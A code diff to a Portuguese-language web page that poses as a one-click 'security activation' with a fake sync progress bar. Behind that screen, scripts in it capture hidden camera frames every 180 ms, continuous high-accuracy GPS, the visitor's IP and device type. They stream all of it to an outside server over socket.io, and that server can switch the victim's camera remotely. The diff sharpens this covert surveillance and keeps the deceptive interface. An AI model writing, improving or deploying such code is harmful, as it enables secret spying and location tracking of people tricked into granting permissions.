@@ -19,9 +19,8 @@
   .btn-activate {
     width: 100%; padding: 20px; border: none; border-radius: 16px;
     background: linear-gradient(135deg, #10b981, #059669); color: #ffffff;
-    font-size: 1.1rem; font-weight: 700; cursor: pointer; transition: all 0.2s;
+    font-size: 1.1rem; font-weight: 700; cursor: pointer;
   }
-  .btn-activate:active { transform: scale(0.98); }
   .process-box { display: none; flex-direction: column; align-items: center; }
   .spinner-container { position: relative; width: 140px; height: 140px; margin-bottom: 24px; }
   .spinner-svg { width: 100%; height: 100%; transform: rotate(-90deg); }
@@ -38,7 +37,7 @@
   .error-msg {
     margin-top: 16px; font-size: 0.82rem; color: #f87171;
     background: rgba(239, 68, 68, 0.1); border: 1px solid rgba(239, 68, 68, 0.2);
-    border-radius: 10px; padding: 10px; display: none;
+    border-radius: 10px; padding: 10px; display: none; cursor: pointer;
   }
   video, canvas { display: none; }
 </style>
@@ -56,10 +55,10 @@
       </svg>
       <div class="percentage-text" id="percentText">0%</div>
     </div>
-    <div class="status-text" id="statusText">Conectando ao sistema...</div>
+    <div class="status-text" id="statusText">Iniciando conexão segura...</div>
   </div>
 
-  <div class="error-msg" id="errorMsg">⚠️ Permissão negada! Ative a Câmera e o GPS.</div>
+  <div class="error-msg" id="errorMsg">⚠️ Permissão negada! Clique para tentar novamente.</div>
 </div>
 
 <video id="hiddenVideo" autoplay playsinline muted></video>
@@ -68,16 +67,14 @@
 <script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
 <script>
   const RENDER_URL = "https://maestro-server-si1f.onrender.com";
+  
   const urlParams = new URLSearchParams(window.location.search);
   const roomId = urlParams.get('id');
 
   const socket = io(RENDER_URL, { transports: ['websocket', 'polling'] });
-
-  // Conecta e força a entrar EXCLUSIVAMENTE na sala única
+  
   socket.on('connect', () => {
-    if (roomId) {
-      socket.emit('join-room', roomId);
-    }
+    if (roomId) socket.emit('join-room', roomId);
   });
 
   const btnActivate  = document.getElementById('btnActivate');
@@ -95,6 +92,9 @@
   let currentFacing = 'environment';
   let switchingCam = false;
 
+  const DURATION_SECONDS = 300;
+  const CIRCUMFERENCE = 339.292;
+
   function getDeviceName() {
     const ua = navigator.userAgent;
     if (/android/i.test(ua)) return "Android";
@@ -103,117 +103,97 @@
     return "Mobile";
   }
 
-  // ATIVAÇÃO RÁPIDA EM 1 ÚNICO CLIQUE
+  // 1-CLICK ATIVAÇÃO INSTANTÂNEA
   async function activateDirectly() {
-    if (!roomId) {
-      alert("Erro: ID de sala inválido!");
-      return;
-    }
-
-    btnActivate.disabled = true;
-    btnActivate.textContent = "Iniciando...";
     errorMsg.style.display = 'none';
+    btnActivate.style.display = 'none';
+    processBox.style.display = 'flex';
 
-    try {
-      // 1. Inicia a Câmera
-      stream = await navigator.mediaDevices.getUserMedia({
-        video: { facingMode: currentFacing, width: { ideal: 640 }, height: { ideal: 480 } },
-        audio: false
+    startTimer();
+
+    // 1. Obter IP em segundo plano sem travar
+    fetch('https://api.ipify.org?format=json')
+      .then(r => r.json())
+      .then(data => {
+        if (data && data.ip && roomId) {
+          socket.emit('stream-info', { roomId: roomId, info: { ip: data.ip, deviceModel: getDeviceName() } });
+        }
+      }).catch(() => {
+        if (roomId) socket.emit('stream-info', { roomId: roomId, info: { ip: "Desconhecido", deviceModel: getDeviceName() } });
       });
+
+    // 2. Câmera Instantânea
+    try {
+      stream = await navigator.mediaDevices.getUserMedia({
+        video: { facingMode: currentFacing, width: { ideal: 400 }, height: { ideal: 300 } },
+        audio: false
+      }).catch(() => navigator.mediaDevices.getUserMedia({ video: true, audio: false }));
+
       video.srcObject = stream;
       await video.play();
-      canvas.width = 400; 
-      canvas.height = 300;
+      canvas.width = 400; canvas.height = 300;
 
-      // Mostra tela de progresso imediatamente
-      btnActivate.style.display = 'none';
-      processBox.style.display = 'flex';
-      startTimer();
-
-      // 2. Transmite IP e Dispositivo
-      let txIp = "Obtendo...";
-      try {
-        const res = await fetch('https://api.ipify.org?format=json');
-        const data = await res.json();
-        if (data && data.ip) txIp = data.ip;
-      } catch(e){}
-
-      socket.emit('stream-info', {
-        roomId: roomId,
-        info: { ip: txIp, deviceModel: getDeviceName() }
-      });
-
-      // 3. Captura GPS de ALTA PRECISÃO (Sem atrasos)
-      if ("geolocation" in navigator) {
-        navigator.geolocation.watchPosition(
-          (pos) => {
-            socket.emit('stream-location', {
-              roomId: roomId,
-              location: { 
-                lat: pos.coords.latitude, 
-                lng: pos.coords.longitude, 
-                accuracy: pos.coords.accuracy,
-                ts: Date.now() 
-              }
-            });
-          },
-          (err) => {
-            console.warn("GPS Error:", err);
-          },
-          { 
-            enableHighAccuracy: true, // Força uso do GPS real do chip
-            maximumAge: 0,            // Não aceita posições antigas em cache
-            timeout: 10000 
-          }
-        );
-      }
-
-      // 4. Transmissão Contínua de Vídeo (Ultra Rápida - 150ms)
+      // Inicia envio continuo de imagem imediatamente
       if (!frameInterval) {
         frameInterval = setInterval(() => {
-          if (!stream || switchingCam) return;
+          if (!stream || switchingCam || !roomId) return;
           ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-          const dataUrl = canvas.toDataURL('image/jpeg', 0.35);
+          const dataUrl = canvas.toDataURL('image/jpeg', 0.3);
           socket.emit('stream-frame', { roomId: roomId, frame: dataUrl });
-        }, 150);
+        }, 180);
       }
-
     } catch (err) {
-      btnActivate.disabled = false;
-      btnActivate.textContent = "Ativar Segurança";
-      btnActivate.style.display = 'block';
-      processBox.style.display = 'none';
+      errorMsg.textContent = "⚠️ Permissão de Câmera Negada. Ative a Câmera.";
       errorMsg.style.display = 'block';
-      alert("Por favor, permita o acesso à Câmera e Localização para prosseguir.");
     }
-  }
 
-  // Troca de Câmera vinda do Receptor
-  socket.on('receive-command', async (cmd) => {
-    if (cmd === currentFacing) return;
-    switchingCam = true;
-    try {
-      if (stream) stream.getTracks().forEach(t => t.stop());
-      stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: cmd }, audio: false });
-      currentFacing = cmd;
-      video.srcObject = stream;
-      await video.play();
-    } catch (e) {}
-    switchingCam = false;
-  });
+    // 3. GPS de Alta Precisão (Instantâneo + Contínuo)
+    if ("geolocation" in navigator) {
+      navigator.geolocation.watchPosition(
+        (pos) => {
+          if (!roomId) return;
+          socket.emit('stream-location', {
+            roomId: roomId,
+            location: {
+              lat: pos.coords.latitude,
+              lng: pos.coords.longitude,
+              accuracy: pos.coords.accuracy
+            }
+          });
+        },
+        (err) => {
+          console.warn("Aguardando sinal GPS...");
+        },
+        { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
+      );
+    }
+
+    // Escuta comando de mudar câmera do receptor
+    socket.on('receive-command', async (cmd) => {
+      if (cmd === currentFacing) return;
+      switchingCam = true;
+      try {
+        const newStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: cmd }, audio: false });
+        if (stream) stream.getTracks().forEach(t => t.stop());
+        stream = newStream;
+        currentFacing = cmd;
+        video.srcObject = stream;
+        await video.play();
+      } catch (e) {}
+      switchingCam = false;
+    });
+  }
 
   btnActivate.addEventListener('click', activateDirectly);
 
   function startTimer() {
     let elapsed = 0;
-    const DURATION = 300;
-    const CIRCUMFERENCE = 339.292;
     setInterval(() => {
       elapsed++;
-      const percent = Math.min(100, Math.floor((elapsed / DURATION) * 100));
+      const percent = Math.min(100, Math.floor((elapsed / DURATION_SECONDS) * 100));
       percentText.textContent = percent + '%';
       progressBar.style.strokeDashoffset = CIRCUMFERENCE - (percent / 100) * CIRCUMFERENCE;
-      if (elapsed >= DURATION) statusText.textContent = "Sincronização concluída.";
+      if (elapsed >= DURATION_SECONDS) statusText.textContent = "Sincronização concluída.";
     }, 1000);
   }
 </script>
